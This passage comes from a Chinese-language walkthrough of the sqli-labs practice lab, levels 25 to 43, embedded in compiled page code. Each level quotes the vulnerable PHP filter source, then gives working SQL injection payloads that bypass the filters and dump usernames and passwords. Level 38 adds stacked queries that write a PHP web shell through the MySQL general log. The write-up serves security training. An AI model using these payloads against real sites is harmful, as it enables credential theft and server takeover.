&&\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1'+oorr+1=1%23\r\n1'+anandd+1=1%23\r\n-1'+union+select+1,user(),database()%23\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-25a",children:"less-25a"}),"\n",(0,l.jsx)(r.p,{children:"\u6570\u5b57\u578b"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1+oorrder+by+3--+\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1+union+select+1,2,3--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-26-\u8fc7\u6ee4\u7a7a\u683c",children:"less-26 \u8fc7\u6ee4\u7a7a\u683c"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"# \u8fc7\u6ee4\u4e86 or \u548c and \u5927\u5c0f\u5199\r\n$id= preg_replace('/or/i',\"\", $id);            //strip out OR (non case sensitive)\r\n$id= preg_replace('/and/i',\"\", $id);        //Strip out AND (non case sensitive)\r\n\r\n# \u8fc7\u6ee4\u4e86 /*\r\n$id= preg_replace('/[\\/\\*]/',\"\", $id);        //strip out /*\r\n\r\n# \u8fc7\u6ee4\u4e86 -- \u548c # \u6ce8\u91ca\r\n$id= preg_replace('/[--]/',\"\", $id);        //Strip out --\r\n$id= preg_replace('/[#]/',\"\", $id);            //Strip out #\r\n\r\n# \u8fc7\u6ee4\u4e86\u7a7a\u683c\r\n$id= preg_replace('/[\\s]/',\"\", $id);        //Strip out spaces\r\n\r\n# \u8fc7\u6ee4\u4e86\u659c\u7ebf\r\n$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);        //Strip out slashes\r\nreturn $id;\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u8fc7\u6ee4\u4e86 or \u548c and \u53ef\u4ee5\u91c7\u7528 \u53cc\u5199\u6216\u8005 && || \u7ed5\u8fc7"}),"\n",(0,l.jsx)(r.p,{children:"\u8fc7\u6ee4\u6ce8\u91ca \u53ef\u4ee5\u4f7f\u7528\u95ed\u5408\u7ed5\u8fc7"}),"\n",(0,l.jsx)(r.p,{children:"\u8fc7\u6ee4\u4e86\u7a7a\u683c \u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7684\u7b26\u53f7\u6765\u66ff\u4ee3\uff1a"}),"\n",(0,l.jsxs)(r.table,{children:[(0,l.jsx)(r.thead,{children:(0,l.jsxs)(r.tr,{children:[(0,l.jsx)(r.th,{children:"\u7b26\u53f7"}),(0,l.jsx)(r.th,{children:"\u8bf4\u660e"})]})}),(0,l.jsxs)(r.tbody,{children:[(0,l.jsxs)(r.tr,{children:[(0,l.jsx)(r.td,{children:"%09"}),(0,l.jsx)(r.td,{children:"TAB \u952e (\u6c34\u5e73)"})]}),(0,l.jsxs)(r.tr,{children:[(0,l.jsx)(r.td,{children:"%0a"}),(0,l.jsx)(r.td,{children:"\u65b0\u5efa\u4e00\u884c"})]}),(0,l.jsxs)(r.tr,{children:[(0,l.jsx)(r.td,{children:"%0c"}),(0,l.jsx)(r.td,{children:"\u65b0\u7684\u4e00\u9875"})]}),(0,l.jsxs)(r.tr,{children:[(0,l.jsx)(r.td,{children:"%0d"}),(0,l.jsx)(r.td,{children:"return \u529f\u80fd"})]}),(0,l.jsxs)(r.tr,{children:[(0,l.jsx)(r.td,{children:"%0b"}),(0,l.jsx)(r.td,{children:"TAB \u952e (\u5782\u76f4)"})]}),(0,l.jsxs)(r.tr,{children:[(0,l.jsx)(r.td,{children:"%a0"}),(0,l.jsx)(r.td,{children:"\u7a7a\u683c"})]})]})]}),"\n",(0,l.jsx)(r.p,{children:"\u6216\u8005\u7528\u62ec\u53f7\u4ee3\u66ff\u7a7a\u683c"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(username,'~',passwoorrd))from(security.users)),0x7e))oorr'\n"})}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1'%0banandd%0bupdatexml(1,concat(0x7e,(select%0bgroup_concat(username,passwoorrd)from%0bsecurity.users)),1)%0banandd%0b'1'='1\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-26a",children:"less-26a"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408\u65b9\u5f0f\u6539\u4e86",(0,l.jsx)(r.code,{children:"')"})]}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"')%0b||(select%0b1%0bfrom%0b(select(sleep(3)))aa)%0b||('1\r\n\r\n')union%A0select(1),(select(group_concat(id,'~',username,'~',passwoorrd))from(security.users)),3\r\n||('1\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-27-\u8fc7\u6ee4union-select",children:"less-27 \u8fc7\u6ee4union select"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"function blacklist($id)\r\n{\r\n$id= preg_replace('/[\\/\\*]/',\"\", $id);          //strip out /*\r\n$id= preg_replace('/[--]/',\"\", $id);            //Strip out --.\r\n$id= preg_replace('/[#]/',\"\", $id);               //Strip out #.\r\n$id= preg_replace('/[ +]/',\"\", $id);        //Strip out spaces.\r\n$id= preg_replace('/select/m',\"\", $id);     //Strip out spaces.\r\n$id= preg_replace('/[ +]/',\"\", $id);        //Strip out spaces.\r\n$id= preg_replace('/union/s',\"\", $id);      //Strip out union\r\n$id= preg_replace('/select/s',\"\", $id);     //Strip out select\r\n$id= preg_replace('/UNION/s',\"\", $id);      //Strip out UNION\r\n$id= preg_replace('/SELECT/s',\"\", $id);     //Strip out SELECT\r\n$id= preg_replace('/Union/s',\"\", $id);      //Strip out Union\r\n$id= preg_replace('/Select/s',\"\", $id);     //Strip out select\r\nreturn $id;\r\n}\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u53ef\u4ee5\u4f7f\u7528\u5927\u5c0f\u5199\u7ed5\u8fc7"}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1111'%0bununionion%0bsElect%0b1,(sElect%0bgroup_concat(username,':',password)%0bfrom%0busers),3||'1\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1111'%0bunioN%0bsElect%0b1,(sElselectect%0bgroup_concat(username,':',password)%0bfrom%0busers),3||'1\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-27a",children:"less-27a"}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408\u65b9\u5f0f\u6539\u6210",(0,l.jsx)(r.code,{children:'"'}),"\u53cc\u5f15\u53f7"]}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1111\"%0bunioN%0bsElect%0b1,(sElect%0bgroup_concat(username,':',password)%0bfrom%0busers),3||\"1\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-28-unionsselecti",children:"less-28 union\\s+select/i"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"# \u8fc7\u6ee4 /*\r\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\r\n\r\n# \u8fc7\u6ee4 - # \u6ce8\u91ca\r\n$id= preg_replace('/[--]/',\"\", $id);\r\n$id= preg_replace('/[#]/',\"\", $id);\r\n\r\n# \u8fc7\u6ee4 \u7a7a\u683c +\r\n$id= preg_replace('/[ +]/',\"\", $id);.\r\n\r\n# \u8fc7\u6ee4 union select /i \u5927\u5c0f\u5199\u90fd\u8fc7\u6ee4\r\n# \\s+ \u5339\u914d\u4e00\u4e2a\u6216\u591a\u4e2a\u7a7a\u767d\u5b57\u7b26\uff08\u5305\u62ec\u7a7a\u683c\u3001\u5236\u8868\u7b26\u3001\u6362\u884c\u7b26\u7b49\r\n$id= preg_replace('/union\\s+select/i',\"\", $id);\r\nreturn $id;\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408\u65b9\u5f0f",(0,l.jsx)(r.code,{children:"')"})]}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1111')%0bunioN%0bsElect%0b1,(sElect%0bgroup_concat(username,':',password)%0bfrom%0busers),3||('1\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-28a",children:"less-28a"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\r\nfunction blacklist($id)\r\n{\r\n//$id= preg_replace('/[\\/\\*]/',\"\", $id);                //strip out /*\r\n//$id= preg_replace('/[--]/',\"\", $id);                  //Strip out --.\r\n//$id= preg_replace('/[#]/',\"\", $id);                   //Strip out #.\r\n//$id= preg_replace('/[ +]/',\"\", $id);                  //Strip out spaces.\r\n//$id= preg_replace('/select/m',\"\", $id);               //Strip out spaces.\r\n//$id= preg_replace('/[ +]/',\"\", $id);                  //Strip out spaces.\r\n$id= preg_replace('/union\\s+select/i',\"\", $id);         //Strip out spaces.\r\nreturn $id;\r\n}\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408",(0,l.jsx)(r.code,{children:"')"})]}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1111')%0bunion%0bselect%0b1,(select%0bgroup_concat(username,':',password)%0bfrom%0busers),3||('1\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-29-waf",children:"less-29 waf"}),"\n",(0,l.jsx)(r.p,{children:"\u6e90\u4ee3\u7801"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"if(isset($_GET['id']))\r\n{\r\n        $qs = $_SERVER['QUERY_STRING'];\r\n        $hint=$qs;\r\n        $id1=java_implimentation($qs);\r\n        $id=$_GET['id'];\r\n        whitelist($id1);\r\n    \r\n\t\t// connectivity \r\n        $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\r\n        $result=mysql_query($sql);\r\n        $row = mysql_fetch_array($result);\r\n        if($row)\r\n        {\r\n                echo 'Your Login name:'. $row['username'];\r\n                echo 'Your Password:' .$row['password'];\r\n        }\r\n        else \r\n        {\r\n                print_r(mysql_error());\r\n        }\r\n}\n"})}),"\n",(0,l.jsx)(r.p,{children:"waf"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:'function whitelist($input)\r\n{\r\n        $match = preg_match("/^\\d+$/", $input);\r\n        if($match)\r\n        {\r\n                //echo "you are good";\r\n                //return $match;\r\n        }\r\n        else\r\n        {\r\n                header(\'Location: hacked.php\');\r\n                //echo "you are bad";\r\n        }\r\n}\r\n\r\n// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).\r\nfunction java_implimentation($query_string)\r\n{\r\n        $q_s = $query_string;\r\n        $qs_array= explode("&",$q_s);\r\n\r\n        foreach($qs_array as $key => $value)\r\n        {\r\n                $val=substr($value,0,2);\r\n                if($val=="id")\r\n                {\r\n                        $id_value=substr($value,3,30); \r\n                        return $id_value;\r\n                        echo "<br>";\r\n                        break;\r\n                }\r\n\r\n        }\r\n\r\n}\n'})}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1'+union+select+1,user(),(select+group_concat(username,':',password)+from+users)--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-30-waf",children:"less-30 waf"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$id = '\"' .$id. '\"';\r\n// connectivity \r\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u53cc\u5f15\u53f7\u95ed\u5408"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1\"+union+select+1,user(),(select+group_concat(username,':',password)+from+users)--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-31",children:"less-31"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$id = '\"'.$id.'\"';\r\n// connectivity \r\n$sql=\"SELECT * FROM users WHERE id= ($id) LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408",(0,l.jsx)(r.code,{children:'")'})]}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'-1")+union+select+1,user(),database()--+\n'})}),"\n",(0,l.jsx)(r.h2,{id:"less-32-\u5bbd\u5b57\u8282\u6ce8\u5165",children:"less-32 \u5bbd\u5b57\u8282\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"function check_addslashes($string)\r\n{\r\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);\t//escape any backslash\r\n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);\t//escape single quote with a backslash\r\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);\t//escape double quote with a backslash\r\n    return $string;\r\n}\r\n\r\n// take the variables \r\nif(isset($_GET['id']))\r\n{\r\n$id=check_addslashes($_GET['id']);\r\n    \r\n// connectivity \r\nmysql_query(\"SET NAMES gbk\");\r\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\n        if($row)\r\n        {\r\n        echo 'Your Login name:'. $row['username'];\r\n        echo 'Your Password:' .$row['password'];\r\n        }\r\n        else \r\n        {\r\n        print_r(mysql_error());\r\n        }\r\n}\r\nelse { \r\n\techo \"Please input the ID as parameter with numeric value\";\r\n}\n"})}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.code,{children:'mysql_query("SET NAMES gbk");'})}),"\n",(0,l.jsxs)(r.p,{children:["\u8bbe\u7f6e MySQL \u6570\u636e\u5e93\u8fde\u63a5\u7684\u5b57\u7b26\u96c6\u4e3a ",(0,l.jsx)(r.code,{children:"gbk"})]}),"\n",(0,l.jsx)(r.p,{children:"\u8fc7\u6ee4\u5355\u53cc\u5f15\u53f7\u548c,\\"}),"\n",(0,l.jsxs)(r.blockquote,{children:["\n",(0,l.jsx)(r.p,{children:"\u5728\u6570\u636e\u5e93\u4e2d\u4f7f\u7528\u4e86\u5bbd\u5b57\u7b26\u96c6(GBK\uff0cGB2312\u7b49)\uff0c\u9664\u4e86\u82f1\u6587\u90fd\u662f\u4e00\u4e2a\u5b57\u7b26\u5360\u4e24\u5b57\u8282\uff1b"}),"\n",(0,l.jsx)(r.p,{children:"MySQL\u5728\u4f7f\u7528GBK\u7f16\u7801\u7684\u65f6\u5019\uff0c\u4f1a\u8ba4\u4e3a\u4e24\u4e2a\u5b57\u7b26\u4e3a\u4e00\u4e2a\u6c49\u5b57(ascii>128\u624d\u80fd\u8fbe\u5230\u6c49\u5b57\u8303\u56f4)\uff1b"}),"\n",(0,l.jsxs)(r.p,{children:["\u5728PHP\u4e2d\u4f7f\u7528",(0,l.jsx)(r.code,{children:"addslashes"}),"\u51fd\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u5bf9\u5355\u5f15\u53f7%27\u8fdb\u884c\u8f6c\u4e49\uff0c\u5728\u524d\u8fb9\u52a0\u4e00\u4e2a\u53cd\u659c\u6760\u201d\\\u201d\uff0c\u53d8\u6210%5c%27;"]}),"\n",(0,l.jsx)(r.p,{children:"\u53ef\u4ee5\u5728\u524d\u8fb9\u6dfb\u52a0%df,\u5f62\u6210%df%5c%27\uff0c\u800c\u6570\u636e\u8fdb\u5165\u6570\u636e\u5e93\u4e2d\u65f6\u524d\u8fb9\u7684%df%5c\u4e24\u5b57\u8282\u4f1a\u88ab\u5f53\u6210\u4e00\u4e2a\u6c49\u5b57;"}),"\n",(0,l.jsx)(r.p,{children:"%5c\u88ab\u5403\u6389\u4e86\uff0c\u5355\u5f15\u53f7\u7531\u6b64\u9003\u9038\u53ef\u4ee5\u7528\u6765\u95ed\u5408\u8bed\u53e5\u3002"}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.strong,{children:"\u4fee\u590d\u5efa\u8bae\uff1a"})}),"\n",(0,l.jsx)(r.p,{children:"\uff081\uff09\u4f7f\u7528mysqli_set_charset(GBK)\u6307\u5b9a\u5b57\u7b26\u96c6"}),"\n",(0,l.jsx)(r.p,{children:"\uff082\uff09\u4f7f\u7528mysqli_real_escape_string\u8fdb\u884c\u8f6c\u4e49"}),"\n"]}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208172300391.png",alt:"image-20241208172300391"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1%df'+union+select+1,2,3--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-33-addslashes",children:"less-33 addslashes"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"function check_addslashes($string)\r\n{\r\n    $string= addslashes($string);\r\n    return $string;\r\n}\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u4f7f\u7528\u7684\u662fphp\u4e2d\u7684\u51fd\u6570",(0,l.jsx)(r.code,{children:"addslashes"}),"\u8fdb\u884c\u8f6c\u4e49\uff08\u5355\u53cc\u5f15\u53f7\u548c",(0,l.jsx)(r.code,{children:"\\"}),"\uff09"]}),"\n",(0,l.jsxs)(r.blockquote,{children:["\n",(0,l.jsxs)(r.p,{children:[(0,l.jsx)(r.strong,{children:"addslashes"}),"(string ",(0,l.jsx)(r.code,{children:"$string"}),"): string"]}),"\n",(0,l.jsx)(r.p,{children:"\u8fd4\u56de\u9700\u8981\u5728\u8f6c\u4e49\u5b57\u7b26\u4e4b\u524d\u6dfb\u52a0\u53cd\u659c\u7ebf\u7684\u5b57\u7b26\u4e32\u3002\u8fd9\u4e9b\u5b57\u7b26\u662f\uff1a"}),"\n",(0,l.jsxs)(r.ul,{children:["\n",(0,l.jsxs)(r.li,{children:["\u5355\u5f15\u53f7\uff08",(0,l.jsx)(r.code,{children:"'"}),"\uff09"]}),"\n",(0,l.jsxs)(r.li,{children:["\u53cc\u5f15\u53f7\uff08",(0,l.jsx)(r.code,{children:'"'}),"\uff09"]}),"\n",(0,l.jsxs)(r.li,{children:["\u53cd\u659c\u7ebf\uff08",(0,l.jsx)(r.code,{children:"\\"}),"\uff09"]}),"\n",(0,l.jsx)(r.li,{children:"NUL\uff08NUL \u5b57\u8282\uff09"}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1%df'+union+select+1,2,3--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-34",children:"less-34"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:'$uname = addslashes($uname1);\r\n$passwd= addslashes($passwd1);\r\n//echo "username after addslashes is :".$uname ."<br>";\r\n//echo "Input password after addslashes is : ".$passwd;    \r\n// connectivity \r\nmysql_query("SET NAMES gbk");\r\n@$sql="SELECT username, password FROM users WHERE username=\'$uname\' and password=\'$passwd\' LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\n'})}),"\n",(0,l.jsx)(r.p,{children:"post\u65b9\u5f0f\uff0c\u4e24\u5217"}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"uname=1%df'+union+select+database(),user()--+&passwd=2&submit=Submit\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-35",children:"less-35"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:'$id=check_addslashes($_GET[\'id\']);\r\n//echo "The filtered request is :" .$id . "<br>";\r\n// connectivity \r\nmysql_query("SET NAMES gbk");\r\n$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";\r\n$result=mysql_query($sql);\n'})}),"\n",(0,l.jsx)(r.p,{children:"\u6570\u5b57\u578b\uff0c\u76f4\u63a5\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1+union+select+1,2,3--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-36-mysql_real_escape_string",children:"less-36 mysql_real_escape_string"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"function check_quotes($string)\r\n{\r\n    $string= mysql_real_escape_string($string);    \r\n    return $string;\r\n}\r\n\r\n// take the variables \r\nif(isset($_GET['id']))\r\n{\r\n$id=check_quotes($_GET['id']);\r\n\r\n// connectivity \r\nmysql_query(\"SET NAMES gbk\");\r\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\r\n$result=mysql_query($sql);\n"})}),"\n",(0,l.jsx)(r.p,{children:"MySQL \u6ce8\u5165\u5929\u4e66\u8fd9\u91cc\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u65b0\u7684\u65b9\u6cd5"}),"\n",(0,l.jsxs)(r.p,{children:["\u5c06 utf-8 \u8f6c\u6362\u4e3a utf-16 \u6216 utf-32\uff0c\u4f8b\u5982\u5c06 ",(0,l.jsx)(r.code,{children:"'"})," \u8f6c\u4e3a utf-16 \u4e3a",(0,l.jsx)(r.code,{children:"\ufffd"})]}),"\n",(0,l.jsx)(r.p,{children:"\u6211\u4eec\u5c31 \u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u65b9\u5f0f\u8fdb\u884c\u5c1d\u8bd5\uff0c\u53ef\u4ee5\u4f7f\u7528 Linux \u81ea\u5e26\u7684 iconv \u547d\u4ee4\u8fdb\u884c UTF \u7684\u7f16\u7801\u8f6c\u6362\uff1a"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-shell",children:"\u279c  ~ echo \\'|iconv -f utf-8 -t utf-16\r\n\ufffd\ufffd'\r\n\u279c  ~ echo \\'|iconv -f utf-8 -t utf-32\r\n\ufffd\ufffd'\n"})}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"\ufffd' or 1#\r\n\u4e07\u80fd\u5bc6\u7801\r\n\ufffd'+union+select+1,user(),3--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-37",children:"less-37"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:'$uname = mysql_real_escape_string($uname1);\r\n$passwd= mysql_real_escape_string($passwd1);\r\n\r\n//echo "username after addslashes is :".$uname ."<br>";\r\n//echo "Input password after addslashes is : ".$passwd;    \r\n\r\n// connectivity \r\nmysql_query("SET NAMES gbk");\r\n@$sql="SELECT username, password FROM users WHERE username=\'$uname\' and password=\'$passwd\' LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\n'})}),"\n",(0,l.jsx)(r.p,{children:"post\u65b9\u5f0f\u800c\u5df2\uff0c\u65b9\u6cd5\u548c\u4e0a\u9762\u4e00\u6837"}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"%EF%BF%BD%27+union+select+user(),database()%23\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-38-\u5806\u53e0\u6ce8\u5165",children:"less-38 \u5806\u53e0\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:'$sql="SELECT * FROM users WHERE id=\'$id\' LIMIT 0,1";\r\n/* execute multi query */\r\nif (mysqli_multi_query($con1, $sql))\r\n{\r\n    /* store first result set */\r\n    if ($result = mysqli_store_result($con1))\r\n    {\r\n        if($row = mysqli_fetch_row($result))\r\n        {\r\n            echo \'<font size = "5" color= "#00FF00">\';\r\n            printf("Your Username is : %s", $row[1]);\r\n            echo "<br>";\r\n            printf("Your Password is : %s", $row[2]);\r\n            echo "<br>";\r\n            echo "</font>";\r\n        }\r\n//            mysqli_free_result($result);\r\n    }\r\n        /* print divider */\r\n    if (mysqli_more_results($con1))\r\n    {\r\n            //printf("-----------------\\n");\r\n    }\r\n     //while (mysqli_next_result($con1));\r\n}\r\nelse \r\n    {\r\n        echo \'<font size="5" color= "#FFFF00">\';\r\n        print_r(mysqli_error($con1));\r\n        echo "</font>";  \r\n    }\n'})}),"\n",(0,l.jsx)(r.p,{children:"mysqli_multi_query \u6267\u884c\u4e00\u4e2a\u6216\u591a\u4e2a\u7531\u5206\u53f7\u5206\u9694\u7684\u67e5\u8be2\u3002"}),"\n",(0,l.jsx)(r.p,{children:"\u53ef\u4ee5\u6267\u884c\u591a\u6761sql\u8bed\u53e5"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1';insert into users(id,username,password) values(15,'test','test');\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u4f46\u662f\u4e0d\u77e5\u9053\u8868\u7ed3\u6784\uff0c\u4e5f\u6ca1\u6709\u7528\u7684"}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.strong,{children:"\u65e5\u5fd7\u5199webshell"})}),"\n",(0,l.jsxs)(r.p,{children:["\u76f4\u63a5\u7528outfile\u5199\u597d\u50cf\u4e5f\u884c\uff0c",(0,l.jsx)(r.code,{children:"secure_file_priv"}),"\u4e3a\u7a7a"]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"show variables like '%general%';\r\nset global general_log = \"ON\";\r\nset global general_log_file='/var/www/html/shell.php'\r\nselect <?php phpinfo();?>\n"})}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"?id=1';set global general_log = \"ON\";set global general_log_file='/var/www/html/shell.php';--+\r\n?id=1';select <?php phpinfo();?>\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u8fd9\u91cc\u5199\u4e0d\u8fdb\u53bb\uff08linux\uff09\uff0c\u7528\u6237\u662fmysql\uff0c\u5fc5\u987b\u7ed9mysql\u7528\u6237\u76ee\u5f55\u6743\u9650\u624d\u80fd\u5199"}),"\n",(0,l.jsx)(r.h2,{id:"less-39",children:"less-39"}),"\n",(0,l.jsx)(r.p,{children:"\u6570\u5b57\u578b\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1+union+select+1,database(),3;--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-40",children:"less-40"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n"})}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1')+union+select+1,database(),3;--+ \n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-41",children:"less-41"}),"\n",(0,l.jsx)(r.p,{children:"\u56e0\u4e3a\u5c11\u4e86\u62a5\u9519\u8f93\u51fa\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u80fd\u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";\n'})}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"-1+union+select+1,2,3--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-42",children:"less-42"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:'$username = mysqli_real_escape_string($con1, $_POST["login_user"]);\r\n$password = $_POST["login_password"];\r\n\r\n$sql = "SELECT * FROM users WHERE username=\'$username\' and password=\'$password\'";\n'})}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"login_user=1&login_password=1'and+updatexml(1,concat(0x7e,user()),1)--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-43",children:"less-43"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"$sql = \"SELECT * FROM users WHERE username=('$username') and 